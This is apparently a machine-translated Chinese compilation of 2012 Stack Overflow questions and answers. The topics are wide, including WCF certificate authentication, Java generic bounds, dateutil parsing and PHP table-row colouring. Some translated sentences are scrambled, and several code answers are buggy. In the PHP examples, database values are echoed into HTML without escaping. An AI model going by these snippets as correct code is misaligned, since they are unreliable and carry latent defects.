                <span class="field-validation-valid" data-valmsg-for="[0].Price" data-valmsg-replace="true"></span>
            </div>
            <div class="editor-label">
                <label for="">Quantity</label>
            </div>
            <div class="editor-field">
                <input class="text-box single-line" data-val="true" data-val-number="The field Quantity must be a number." data-val-required="The Quantity field is required." name="[0].Quantity" type="text" value="" />
                <span class="field-validation-valid" data-valmsg-for="[0].Quantity" data-valmsg-replace="true"></span>
            </div> 
```

虽然它应该产生类似的东西

```
<select id="[0].ItemID" name="[1].ItemID"><option value=""></option> 
```

请有任何建议

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-17T14:16:24.740

只需使用 dropdownlistfor 而不是简单的下拉列表。

```
@Html.DropDownListFor(model => model[i].ItemID, (SelectList)ViewBag.ItemID) 
```

# linq-to-sql - 使用依赖注入在 2 个数据上下文中重用查询

> ID：13429510
> 
> 赞同：0
> 
> 时间：2012-11-17T10:01:56.060
> 
> 标签：linq-to-sql, dependency-injection, datacontext

我有一个使用 linq-to-sql 查询（即将升级为 linq-to-EF 编译查询）的 Web 应用程序，并且已经有数据上下文和数据库。我想创建应用程序的演示版本，对于演示，我想使用一个完全不同的数据库文件，但它具有相同的表。因此，本质上，我将为两个不同的数据库使用相同的数据结构：一个用于登录用户的数据库，一个用于演示用户的数据库。我想重用我已经写过的许多查询；它们看起来像这样：

```
 public class FruitQueries
 {
        public List<SomeObjectModel> MyQuery(list of parameters)
        {
           using (MyDataContext TheDC = new MyDataContext())
           {
              var TheQueryResult = (from f in TheDC.Fruits
                                    ......).ToList();

              return TheQueryResult;
           }
        }

        public List<SomeObject> AnotherQuery(some other parameters) {...}
 } 
```

现在我想我知道这需要依赖注入，其中数据上下文作为参数传入，但我不确定语法。如何使用依赖注入重用查询以使它们在两个不同的数据库上工作？现在我正在使用一个`using`语句，我想保持这种模式；如果我将 DC 作为参数注入，这可能吗？

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-17T12:09:04.520

由于您已经有很多代码，可能最简单的方法是注入一个工厂：

```
public interface IMyDataContextFactory
{
    MyDataContext CreateNewContext();
} 
```

所有代码将大致保持不变：

```
public List<SomeObjectModel> MyQuery(params)
{
   using (var TheDC = this.factory.CreateNewContext())
   {
      var TheQueryResult = (from f in TheDC.Fruits
                            ......).ToList();

      return TheQueryResult;
   }
} 
```

您可以让注入`IMyDataContextFactory`者决定如何构建`MyDataContext`实例（基于用户）。这将是微不足道的。

`MyDataContext`最后，将 a （或诸如 的抽象）注入消费者可能会更好`IUnitOfWork`，但这会彻底改变一切。由于这个类是从外部传入的，消费者不再负责处理它，而是由其他人负责。尽管使用大多数 DI 容器处理这样的实例并不难。但是，当您想`MyDataContext`在多个消费者（例如在同一个 Web 请求中）共享同一个实例时，它会变得更加困难，并且您在哪里调用`SubmitChanges`？

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-17T13:16:11.297

详细说明上一个答案

您可以做的是向 DC 提供连接字符串（这是否符合构造函数注入的条件？）

```
using (MyDataContext TheDC = new MyDataContext(this.factory.CreateConString())) 
```

这样，处置仍然由消费者处理，您可以继续使用 Using() 方法。您的工厂可以从您的 webconfig 中读取两个不同的连接字符串，并根据用户确定要使用的正确连接字符串。（并不像看起来那么微不足道）

PS：我认为最快的方法是将演示应用程序部署到不同的 URL，这样它们就可以有一个单独的 web.config 并且您不需要编写任何代码，但这并不能回答您的问题。

# objective-c - 在ios中开发动物园管理员游戏时如何在UIView上对齐8 * 8图标（图像）

> ID：13429513
> 
> 赞同：1
> 
> 时间：2012-11-17T10:02:16.730
> 
> 标签：objective-c, ios

我在java平台上开发了游戏动物园管理员。现在我需要让它在 ios 上运行，但是我不熟悉 xcode 和 objc。`UIView`我在使用and时遇到了一些问题`UIImageview`。假设我们有 5 种类型的 8*8 图标（图像），我们更改两个相邻图标，并且每当 3 个或更多图标在水平或垂直线上相同时，它们将被消除并创建新图标以替换以前的位置。要在java中实现它，我只需要检查条件并删除那些消除的图标并绘制新的图标（全部根据坐标）然后重新绘制JPanel。但是我将如何在 ios 中实现它？不是说消除过程，我什至不知道如何对齐`UIView`. 起初我想可能`UIImageview`在一个背景上使用然后 addSubview`UIView`. 但是如果这样的话，会有64个子视图，那就一团糟了。我对 xcode 和 objc 很陌生，我只有 2 周的时间来完成这项任务。有人可以帮我解决我的问题吗？非常感谢！！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-17T10:27:21.800

从我收集到的信息来看，在 Java 中，您只是在 JPanels 的paintComponent 中绘制了图标？

好吧，在这种情况下，您**可以**完全模拟。在屏幕上放置一个 uiview，用作您的 JPanel/绘图画布。在 drawRect 中进行绘图的方式与在 java 中相同

@interface CustomView : UIView @end

```
@implementation CustomView

- (void)drawRect:(CGRect)dirtyRect {
    [[UIColor redColor] set];
    for(int ix = 0; ix < ITEMS_PER_ROW; ix++ ) {
        for(int iy = 0; iy < ITEMS_PER_COLUMN; iy++) {
            //draw item at ix and iy
            CGPoint pt = CGPointMake();
            CGRect r = CGRectMake(ix*5;iy*5, 5, 5);
            CGRectFill(r);
        }
    }
}

@end 
```

*内联输入，不保证^^

* * *

**也就是说，我会选择 CALayers**

不是绘制它而是使用 64 个子层.. 也许不是 64 个......也许你可以将它分组一点 => 然后你会受益于隐式动画

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-17T11:32:55.170

我只是没有看到混乱。是的，你最终会在你的背景上拥有 64 个子视图`UIView`。

如果它对您来说更容易或更合乎逻辑，那么您可以创建和定位`UIImageViews`唯一一次，然后只需更改它们的`UIImage`. `UIImage`保存图标本身的 只是一段`UIImageView`时间的属性，它`UIImageView`是视图层次结构的一部分，具有坐标和大小或框架等。

如果你真的对 64 个单独的视图对象很感兴趣：根据你的逻辑在 java 端的工作方式，它可能看起来更合乎逻辑，因此你更容易使用核心数据只绘制一个图像。该图像将由 8x8 图标组成，并且会在每次更改时重新绘制。然后，您`UIImageView`只需填写所有底层证券`UIView`。（严格来说，在这种情况下可能不再需要底层 UIView 了，因为您的`UIImageView`coud 充当`self.view`视图控制器的对象。但我仍然会选择 UIView 只是为了一致地应用通常的模式。）

但是，如果我是你，我会选择一个“修复”网格`UIImageViews`并相应地交换他们的`UIImage`对象。

# javascript - 单击按钮时如何添加新的文本字段

> ID：13429514
> 
> 赞同：9
> 
> 时间：2012-11-17T10:02:27.473
> 
> 标签：javascript, mysql

我想为我的客户创建一个表单。我的客户需要为他创建一个动态。假设我想在mysql的主表中插入1条记录，并在具有主表引用键的辅助表中记录多条记录。我不知道主表有多少条记录，可能一次一条或一次多条记录。我想用单一的形式来做。如果客户端单击添加更多按钮，它会显示另一个文本字段以插入更多数据。我该怎么办？？？？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-17T10:04:16.580

```
It would be possible using pure javascript 
```

像这样

```
<input type="button" onclick="addInput()"/>

<span id="responce"></span>
<script>
var countBox =1;
var boxName = 0;
function addInput()
{
     var boxName="textBox"+countBox; 
document.getElementById('responce').innerHTML+='<br/><input type="text" id="'+boxName+'" value="'+boxName+'" "  /><br/>';
     countBox += 1;
}
</script> 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-18T13:13:44.400

这是代码：

```
 function generateTextBox()
    {

     var mainDiv=document.getElementById('options');
     alert(mainDiv);
     var newBreak=document.createElement('br');
      mainDiv.appendChild(newBreak);
    for(var i=1;i<=4;i++)
      {

     var newTextBox=document.createElement('input');
     var newBreak1=document.createElement('br');
     var newBreak2=document.createElement('br');
     var newBreak3=document.createElement('br');
     var text = document.createTextNode("Option"+i);

     newTextBox.type='text';

     newTextBox.setAttribute('id','txtAddr'+i);
         alert(newTextBox+"2");
        mainDiv.appendChild(text);
     mainDiv.appendChild(newTextBox);
     mainDiv.appendChild(newBreak1);
     mainDiv.appendChild(newBreak2);
     mainDiv.appendChild(newBreak3);

     }
} 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-11-17T10:07:50.413

这可以通过 jquery/javascript 实现。

所以你可以使用这个参考：[http ://www.mkyong.com/jquery/how-to-add-remove-textbox-dynamically-with-jquery/](http://www.mkyong.com/jquery/how-to-add-remove-textbox-dynamically-with-jquery/)

去尝试一下！！

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-17T10:03:20.747

这与 php 无关，您需要使用 javascript 动态添加到表单中。

# python - 形状文件编辑库

> ID：13429516
> 
> 赞同：0
> 
> 时间：2012-11-17T10:02:33.750
> 
> 标签：python, .net, automation, shapefile, arcpy

我需要通过删除我刚收到的一些 ESRI shapefile 中的重复多边形节点来自动更正错误。然而，我对如何使用 ArcPy 来实现这一点感到困惑。

我对图书馆的搜索也没有产生什么结果。最好的一个（[Python Shape File Library](http://code.google.com/p/pyshp)）能够编辑 shapefile，但错误仍然存​​在。

是否有任何免费可用的库可供我用于此任务？
如果没有，我如何使用 ArcPy 来自动化该过程？

我更喜欢 .NET（C# 或 VB.NET）或 Python 中的库。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-18T18:16:03.380

“重复的多边形节点”

不知道节点是什么（旧的覆盖范围除外），但我假设您的意思是多边形环中的重复点。如果您有 arcpy，那么您就有 ArcGIS。为什么不使用修复几何工具箱工具？这也将修复多边形内环或外环上的重复点以及一系列其他几何错误。

如果您要说重复的多边形，那么如果您具有该许可级别，请使用 Find Identical 工具。

# c# - 工作代码异常，删除 try catch 以查看它在哪里

> ID：13429518
> 
> 赞同：0
> 
> 时间：2012-11-17T10:02:39.063
> 
> 标签：c#, exception

我有我的老师未能解决的问题，没有错误，但是当我调试程序时，我得到异常说：“在将字符串转换为日期时间时，在将每个变量放入 DateTime 对象之前解析字符串以获取日期”。在这一行："

```
//stopa poreza
double brutoPlaca = Convert.ToDouble(textBox3.Text);" 
```

原始代码：

```
string stopaDoprinosa; double Doprinos = 0;
string stopaPoreza; double Porez = 0;
double netoPlaca;
//doprinos
if (textBox2.Text == "Osijek")
{ stopaDoprinosa = "13%"; }
else
{ stopaDoprinosa = "8%"; }
//stopa poreza
double brutoPlaca = Convert.ToDouble(textBox3.Text);
if (brutoPlaca <= 3000)
{ stopaPoreza = "10%"; }
else
{ stopaPoreza = "20%"; }

//porez
if (stopaPoreza == "10%")
{ Porez = 0.1; }
if (stopaPoreza == "20%")
{ Porez = 0.2; }

//neto plaća
netoPlaca = brutoPlaca * Porez;
if (stopaDoprinosa == "8%")
{ Doprinos = 0.08; }
if (stopaDoprinosa == "13%")
{ Doprinos = 0.13; }

Djelatnik d = new Djelatnik(textBox1.Text, textBox2.Text, brutoPlaca,stopaDoprinosa,Doprinos,stopaPoreza,Porez,netoPlaca);
Djelatnici.Add(d); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-17T11:03:15.110

要将字符串转换为双数使用`double.Parse()`或`double.TryParse()`方法，如下所示：

```
double brutoPlaca = double.Parse(textBox3.Text); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-17T10:18:01.040

在调试器中打开抛出异常时停止。那是在 Visual Studio 中，转到 Debug->Exceptions 然后勾选 clr exceptions 旁边的框。

[Visual Studio：如何中断处理的异常？](https://stackoverflow.com/questions/116896/visual-studio-how-to-break-on-handled-exceptions)

由于您没有给我们这条线，并且不得不移除一个捕获，我假设您没有这样做。

# java - 声明扩展 2 个不同接口的类型的属性

> ID：13429523
> 
> 赞同：2
> 
> 时间：2012-11-17T10:03:57.937
> 
> 标签：java, generics, types, attributes, covariance

我想声明包含实现 2 个不同接口的类实例的属性。我试过这种语法：

```
private <? extends Interface1 & Interface2> name; 
```

还有这个：

```
private <T extends Interface1 & Interface2> T name; 
```

这些都不起作用。是否可以？语法是什么？我试图避免声明另一个继承自`Interface1`和的接口`Interface2`。

* * *

## 编辑：

包含此属性的类不应有任何类型参数。那不是这样的：

```
public class MyClass<T extends Interface1 & Interface2>{
    private T name;
    ...
} 
```

对于那些使用该类的人来说，这没有任何意义。预计该类是通用的既不合逻辑也不可能。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-17T10:09:26.053

这需要在类声明中进行，例如：

```
public class TestG<T extends Cloneable & Serializable> {
    private T name;
} 
```

一种替代方法是将其设置在方法中（但不是变量）

```
public class TestG {
    public <T extends Cloneable & Serializable> void  method(T parameter) {
    }
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-17T10:10:12.793

`class declaration`您可以在您的, 或中声明该类型参数`method declaration`，如果那是 a `local variable`，则使用该类型：-

```
public class Demo<T extends Interface1 & Interface2> {
    private T t;
} 
```

或者： -

```
public class Demo {
    public <S extends Interface1 & Interface2> void demo(S param1) {
        S param;
    }
} 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-11-17T10:23:17.910

**变量**不能是泛型的。

```
private <T> T var; 
```

不可能 - 在哪一点被`T`定义？访问时`var`，我无法对分配时使用的内容做出太多假设。

Java 允许在**类**和**方法**上使用泛型。所以你可以拥有

```
private <T implements Cloneable & Serializable> void setVar(T val); 
```

你可以有一个类范围的类型`T`。

但请始终记住**，它最终是通过类型擦除实现的**。您始终可以使用 getter、setter 和 cast 来模拟更复杂的逻辑。如果做得好，它会给你同样多的类型安全。

获得具有所需类型安全性的变量的最简单方法是仅使用两个变量和一个 setter 来使它们保持同步。

```
private Serializable vars;
private Cloneable vars; 
```

当然会给你一个很好的类型安全。但是，是的，它需要 4 个字节的额外内存和一个 setter。

这是您询问的铸造方法：

```
private Object internal_var;

// Implementation notice: do not remove this generic.
// Due to a Java limitation, we *do* want these two constraints!
public <T extends Serializable & Cloneable> void setVar(T val) {
    internal_var = val;
}

public Serializable getSerializable() {
    return (Serializable) internal_var; // Type checked in setter!
}

public Cloneable getCloneable() {
    return (Cloneable) internal_var; // Type checked in setter!
}

// This is the way to use it in a generic getter:
public <T extends Serializable & Cloneable> T getVar(Class<? super T> cls) {
    return (T) cls.cast(val);
} 
```

请注意，为了`T`在 getter 中使用，我们*确实*需要一个涉及 T 的参数。假设我们知道一个 class `Example implements Serializable, Cloneable`，我们可以使用

```
// This actually ensures we get an instance of `Example` out:
Example e = instance.getVar(Example.class); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-11-17T10:08:37.133

如果我正确理解您的问题，您需要一个实现两个 inetrfaces 的通用类。在您的类定义中声明一个泛型类型参数并将其设为实例变量类型。

```
public class Implementor<T extends Interface1<T> & Interface2<T>>  {
    private T t;

} 
```

**编辑：**

您不能在实例变量声明中声明类型参数，例如

```
 private <T extends I1 &I2> T t; //this cant be achieved. 
```

在方法级别虽然是可能的。

```
public <T extends I1 & I2> void method(T t){

  } 
```

# python - 没有指定年份的 Python 智能日期解析

> ID：13429524
> 
> 赞同：5
> 
> 时间：2012-11-17T10:04:02.527
> 
> 标签：python, python-dateutil

如何在没有年份的情况下解析日期（使用 dateutil），以便当当前日期为 2012 年 11 月 17 日时，这些日期将被解析如下：

```
print parser.parse("23 nov", dayfirst=True, yearfirst=False, fuzzy=True)
# 23/11/2012
print parser.parse("28 dec", dayfirst=True, yearfirst=False, fuzzy=True)
# 28/12/2012
print parser.parse("3 jan", dayfirst=True, yearfirst=False, fuzzy=True)
# 3/01/2013 
```

我想要的是已经过去的几个月将在今年之后的一年。有什么简单的解决方案吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-17T11:19:47.760

自动查找未来日期：

```
from dateutil import parser
from dateutil.relativedelta import relativedelta

def parse_future(timestr, default, **parse_kwargs):
    """Same as dateutil.parser.parse() but only returns future dates."""
    now = default
    for _ in range(401):  # assume gregorian calendar repeats every 400 year
        try:
            dt = parser.parse(timestr, default=default, **parse_kwargs)
        except ValueError:
            pass
        else:
            if dt > now: # found future date
                break
        default += relativedelta(years=+1)
    else: # future date not found
        raise ValueError('failed to find future date for %r' % (timestr,))
    return dt 
```

### 例子

```
from datetime import datetime

for timestr in ["23 nov", "28 dec", "3 jan", "29 feb"]:
    print parse_future(timestr, default=datetime(2012, 11, 17)).date() 
```

### 输出

```
2012-11-23
2012-12-28
2013-01-03
2016-02-29 
```

注意：“29 feb”翻译为“2016-02-29”。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-17T10:27:59.347

此函数将过去几个月的提供日期添加一年：

```
from datetime import date
from dateutil.relativedelta import relativedelta

def add_one_year_to_passed_months(date):
    today = date.today()
    if date.month < today.month:
        return date + relativedelta(years=1)
    return date 
```

像 2012 年这样的闰年是`relativedelta`这样处理的：

```
>>> add_one_year_to_passed_months(date(2012, 2, 28))
datetime.date(2013, 2, 28)

>>> add_one_year_to_passed_months(date(2012, 2, 29))
datetime.date(2013, 2, 28)

>>> add_one_year_to_passed_months(date(2012, 3, 1))
datetime.date(2013, 3, 1) 
```

# ruby-on-rails - 如果数组中存在值，则有条件地渲染部分

> ID：13429531
> 
> 赞同：0
> 
> 时间：2012-11-17T10:05:33.850
> 
> 标签：ruby-on-rails, ruby-on-rails-3, ruby-on-rails-3.1, ruby-on-rails-3.2

使用acts-as-taggable-on 进行标记。基于之前的问题，我读到我必须最小化视图中的逻辑并为视图模板中的条件创建一个助手。到目前为止，这是我的代码。（纽比轨道）

路线：

```
resources :appartments do
  collection do
    get ':tag', to: 'appartments#index', as: :tag
    end 
```

我的控制器：

```
def index
    if params[:tag]
            @apartments = Appartment.tagged_with(params[:tag])
            else
            @apartments = Appartment.all
            end
    end 
```

应用助手：

```
def render_partials_conditionally
        if @apartments.include?("family")
            render :partial => 'familie'
            if @apartments.include?("groups")
            render :partial => 'groups'
        end
    end
end 
```

这个想法（我假设）是我检查 @apartments 数组中是否存在值“家庭”并包含？方法

公寓索引视图

```
 = render_partials_conditionally 
```

当我去公寓/家庭时，必须显示部分 _family，但什么也没发生……没有错误，没有部分

我究竟做错了什么？

Grtz..remco

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-17T11:52:05.870

如果`Appartment`是一个模型，@apartments 应该是一个对象数组，所以`@apartments.include?("family")`永远`@apartments.include?("groups")`不会是真的。相反，代码可能是这样的：

```
@apartments.any? { |apartment| apartments.some_field == "groups" } 
```

不过我觉得还是不够好。更好的方法可能是助手只返回部分的名称，然后在视图中呈现部分。

# xquery - xquery 包含 xml 文件名

> ID：13429532
> 
> 赞同：0
> 
> 时间：2012-11-17T10:05:42.937
> 
> 标签：xquery, filenames, xmlspy

我在 XMLSPY 中有以下代码片段，它运行正常：

```
xquery version "1.0";
<query2>
{
for $r in /reviews/review
return $r/reviewer
}
</query2> 
```

如何在 xpath 中包含 xml 文件名，例如 abc.xml/reviews/review ？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-17T10:11:34.760

我可以自己解决这个问题：

```
<query2>
{
    for $r in doc("reviews.xml")/reviews/review
    return $r/reviewer
}
</query2> 
```

# ios - addsubview 动画仅在第一次工作

> ID：13429535
> 
> 赞同：0
> 
> 时间：2012-11-17T10:05:54.207
> 
> 标签：ios, uiview, uiviewanimation, catransition

我正在尝试使用下面第一次正常工作的代码添加具有动画效果的子视图。

```
CATransition *transition = [CATransition animation];
transition.duration = 1.0;
transition.type = kCATransitionMoveIn; 
transition.subtype = kCATransitionFromRight;

[newView.layer removeAllAnimations]
[newView.layer addAnimation:transition forKey:nil];
[self.masterview addSubview:newView]; 
```

newView 中有一个后退按钮，可以从超级视图中删除视图。

```
[newView removeFromSuperview]; 
```

现在，当我尝试使用上面的代码再次将 newView 添加为子视图时，它首先将视图添加为子视图（没有动画），然后再次添加动画。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-17T10:57:09.280

而不是从superview中删除newView，为什么不可以设置一个像

```
newView.frame = CGRectMake(0, -500, CGRectGetWidth(newView.frame), CGRectGetHeight(newView.frame)); 
```

这样您就可以将其隐藏起来。只是一个想法。:-)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-17T11:47:25.170

当您从其超级视图中删除视图时，它会保持其框架不变。因此，我认为您必须更改 newView 位置才能再次放置在新位置。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-10-07T11:55:06.830

它在所有时间都可以正常工作。但是您必须找到的唯一区别是您需要在动画期间等待。它不会连续动画。这将花费您在持续时间中提到的最短时间。

# c# - 截屏时出现 GDI+ 错误中的一般错误

> ID：13429536
> 
> 赞同：0
> 
> 时间：2012-11-17T10:06:02.437
> 
> 标签：c#, asp.net

我写的代码如下，我得到这个错误：

`A generic error occurred in GDI+`

```
protected void btnSave_Click(object sender, EventArgs e)
{
    Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.WorkingArea.Width, Screen.PrimaryScreen.WorkingArea.Height);

    Graphics graphics = Graphics.FromImage(bitmap as System.Drawing.Image);

    graphics.CopyFromScreen(100, 0, 0, 0, bitmap.Size);

    bitmap.Save("@file.bmp");
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-17T10:13:53.550

因为 asp.net 作为服务运行，并且无权访问监视器 - 到屏幕 - 实际上在您调用`CopyFromScreen`

另一方面，我希望不要将在服务器上运行的代码和在客户端上运行的代码混在一起，并相信 CopyFromScreen 将复制客户端屏幕，因为此代码不在客户端计算机上运行。

# wcf - WCF 客户端认证

> ID：13429538
> 
> 赞同：0
> 
> 时间：2012-11-17T10:06:16.123
> 
> 标签：wcf, client

我有一个使用 basicHttpBinding 的 WCF 服务。现在我想保护我的方法，这样没有人可以创建代理并使用我的方法。我使用了来自 msdn 的 WCF 客户端认证。却不能更进一步。这是我的 web.config

```
 <system.serviceModel>
<client>
  <endpoint address="http://localhost:57246/Service1.svc" binding="basicHttpBinding"
    bindingConfiguration="BasicHttpBinding_IService1" contract="ServiceReference1.IService1"
    name="BasicHttpBinding_IService1" />
</client>
<services>
  <service name="Microsoft.ServiceModel.Samples.CalculatorService"
           behaviorConfiguration="DataServiceBehavior">
    <host>
      <baseAddresses>
        <add baseAddress="http://localhost:57246/Service1.svc"/>
      </baseAddresses>
    </host>
    <endpoint address=""
       binding="basicHttpBinding"
       bindingConfiguration="Binding1"
       contract="ServiceReference1.IService1" />

    <endpoint address="mex"
              binding="mexHttpBinding"
              contract="IMetadataExchange" />
  </service>
</services>

<bindings>
  <basicHttpBinding>
    <binding name="BasicHttpBinding_IService1">
      <security mode="Message">
        <transport realm="" />
        <message clientCredentialType="Certificate" />
      </security>
    </binding>
  </basicHttpBinding>
</bindings>

<behaviors>
  <serviceBehaviors>
    <behavior name="DataServiceBehavior">
      <serviceMetadata httpGetEnabled="True"/>
      <serviceDebug includeExceptionDetailInFaults="False" />

      <serviceCredentials>
        <serviceCertificate findValue="localhost" storeLocation="LocalMachine" storeName="My" x509FindType="FindBySubjectName" />
        <clientCertificate>

          <authentication certificateValidationMode="PeerOrChainTrust" />
        </clientCertificate>
      </serviceCredentials>
    </behavior>
  </serviceBehaviors>
</behaviors> 
```

现在应该通过升c调用什么。我在 WCF 中有一个名为 showGrid 的方法。

```
public DataSet showGrid()
    {
        SqlDataAdapter da = new SqlDataAdapter("Select * FROM Resources", con);
        DataSet ds = new DataSet();
        da.Fill(ds);
        return ds;
    } 
```

并尝试在单击按钮时这样调用它

```
protected void btnShow_Click(object sender, EventArgs e)
    {
        var client = new ServiceReference1.Service1Client();

 client.ClientCredentials.ClientCertificate.SetCertificate(StoreLocation.CurrentUser, StoreName.My, X509FindType.FindBySubjectName, "localhost");
        client.showGrid();
        GridView1.DataSource = client.showGrid();
        GridView1.DataBind();
    } 
```

现在一个异常是这样抛出的

无法使用以下搜索条件找到 X.509 证书：StoreName 'My'、StoreLocation 'CurrentUser'、FindType 'FindBySubjectName'、FindValue 'localhost'。

如何克服这一点。请帮我。我也用谷歌搜索它。我正在使用 Windows 7 这是保护我的方法的正确方法吗？请指导我。找了很多天这个问题。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-17T10:12:52.927

只需像这样添加客户端证书

```
client.ClientCredentials.ClientCertificate.Certificate = yourcert; 
```

编辑：

```
 X509Certificate2 yourcert= null; 
        var store = new X509Store(storeName, storeLocation);

        store.Open(OpenFlags.OpenExistingOnly | OpenFlags.ReadOnly);
        var certCollection = store.Certificates.Find(findType, thumbprint, false);
        if (certCollection.Count>0)
            yourcert= certCollection[0];
        store.Close(); 
```

# apache - 为字体设置过期标题不起作用

> ID：13429540
> 
> 赞同：25
> 
> 时间：2012-11-17T10:06:55.007
> 
> 标签：apache, .htaccess, fonts, webfonts, expires-header

我在我的 .htaccess 文件中使用下面的代码来尝试为某些字体设置过期标头，但是在检查我的 Firefox 缓存和过期标头后，字体设置为从现在起大约 12 小时内过期；不是我试图设置的 1 年。

这是我的代码：

```
# Add correct content-type for fonts
AddType application/vnd.ms-fontobject .eot
AddType application/x-font-ttf .ttf
AddType application/x-font-opentype .otf
AddType application/x-font-woff .woff
AddType image/svg+xml .svg

# Compress compressible fonts
AddOutputFilterByType DEFLATE application/x-font-ttf application/x-font-opentype image/svg+xml

# Add a far future Expires header for fonts
ExpiresByType application/vnd.ms-fontobject "access plus 1 year"
ExpiresByType application/x-font-ttf "access plus 1 year"
ExpiresByType application/x-font-opentype "access plus 1 year"
ExpiresByType application/x-font-woff "access plus 1 year"
ExpiresByType image/svg+xml "access plus 1 year" 
```

我究竟做错了什么？

* * *

## 回答 #1

> 赞同：76
> 
> 时间：2012-11-17T11:05:48.923

似乎我也必须包括这一点：

```
ExpiresActive on 
```

完整的代码是：

```
# Add correct content-type for fonts
AddType application/vnd.ms-fontobject .eot
AddType font/ttf .ttf
AddType font/otf .otf
AddType font/woff .woff
AddType font/woff2 .woff2
AddType image/svg+xml .svg

# Compress compressible fonts
AddOutputFilterByType DEFLATE font/ttf font/otf image/svg+xml

ExpiresActive on

# Add a far future Expires header for fonts
ExpiresByType application/vnd.ms-fontobject "access plus 1 year"
ExpiresByType font/ttf "access plus 1 year"
ExpiresByType font/otf "access plus 1 year"
ExpiresByType font/woff "access plus 1 year"
ExpiresByType font/woff2 "access plus 1 year"
ExpiresByType image/svg+xml "access plus 1 year" 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-17T10:15:14.060

我相信你的问题是你如何定义字体，不需要添加它们的内容类型

```
 ExpiresByType font/truetype "access plus 1 year"
 ExpiresByType font/opentype "access plus 1 year"
 ExpiresByType application/x-font-woff   "access plus 1 year"
 ExpiresByType image/svg+xml "access plus 1 year"
 ExpiresByType application/vnd.ms-fontobject "access plus 1 year" 
```

# php - PHP While - 每次颜色变化

> ID：13429549
> 
> 赞同：0
> 
> 时间：2012-11-17T10:08:01.890
> 
> 标签：php, css, colors, html-table, gradient

我有一个 PHP while 循环，它在表中显示数据库的内容。我想让表格中的所有行都用不同的颜色。

但不仅仅是随机的。我希望它们有不同深浅的红色，第一行是最红的，然后其余的会变成浅红色。

举个例子，我想要和 iPhone App 一样的效果：Clear。图片示例：[http ://www.realmacsoftware.com/_resources/clear/images/ss_pinch.png](http://www.realmacsoftware.com/_resources/clear/images/ss_pinch.png)

我试图在 CSS 和一些 jQuery 中使用 -nth 来制作效果，但就是想不通。我希望你能试一试。

这是代码：

```
<table>

<tr>
<td align="center"><strong>Navn:</strong></td>
<td align="center"><strong>Spørgsmål:</strong></td>
<td align="center"><strong>Tid:</strong></td>

</tr>
<?php
while($rows=mysql_fetch_array($result)){
?>
<tr>
<td><? echo $rows['name']; ?></td>
<td><? echo $rows['ask']; ?></td>
<td><? echo $rows['time']; ?></td>

<?php
}
?>

</tr>
</table> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-17T10:15:23.000

您必须在表格行中应用 css。

```
<div class="grad">
<table>
<tr>
<td align="center"><strong>Navn:</strong></td>
<td align="center"><strong>Spørgsmål:</strong></td>
<td align="center"><strong>Tid:</strong></td>
</tr>
<?php
while($rows=mysql_fetch_array($result)){
?>
<tr>
<td><? echo $rows['name']; ?></td>
<td><? echo $rows['ask']; ?></td>
<td><? echo $rows['time']; ?></td>
</div>
 <?php
 }
?>
</tr>
</table>

<script>

//css Part
.grad
{
   background: -webkit-gradient(linear, left top, left bottom, from(#ccc), to(#000));
}
</script> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-17T10:25:47.100

如果您需要为每个元素使用不同的颜色，则静态 CSS 文件无法描述。您可以即时生成 CSS 文件，但我选择了内联样式。如果可以使用静态 CSS 文件，请不要使用内联样式。

对于从红色到白色的简单线性插值，遵循您的编码风格。我还删除了一个`</div>`不属于那里的额外内容：

```
<?php
$num_rows=mysql_num_rows($result);
$cur_row=0;
while($rows=mysql_fetch_array($result)){
$color=intval(256*$cur_row/($num_rows-1));
$cur_row++;
?>
<tr style="background:rgb(256,<? echo $color.','.$color;>);">
<td><? echo $rows['name']; ?></td>
<td><? echo $rows['ask']; ?></td>
<td><? echo $rows['time']; ?></td>
<?php
}
?> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-17T11:04:22.003

您还可以使用 Javascript 和 HSV（这是一个不同的“颜色坐标系统”）。

Jsfiddle 演示： http: [//jsfiddle.net/QXLRg/7/](http://jsfiddle.net/QXLRg/7/)
另一个演示： http: [//jsfiddle.net/QXLRg/8/](http://jsfiddle.net/QXLRg/8/)
另一个：http : [//jsfiddle.net/QXLRg/10/](http://jsfiddle.net/QXLRg/10/)

（我所做的只是改变'h'值..）

```
var h = 0.4;
var s = 0.9;
var v = 0.95; 
```

因此，如果您想以编程方式创建不同的颜色，那么使用 HSV 而不是原始 RGB 会更好，因为您可以很好地控制例如“颜色柔和度”等等。如上例所示

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-17T10:13:14.933

```
<?php
$colors = array("yellow","red","green","silver");
$i=0;
while($rows=mysql_fetch_array($result)){
?>
<tr bgcolor="<?php echo $colors[$i]; ?>">
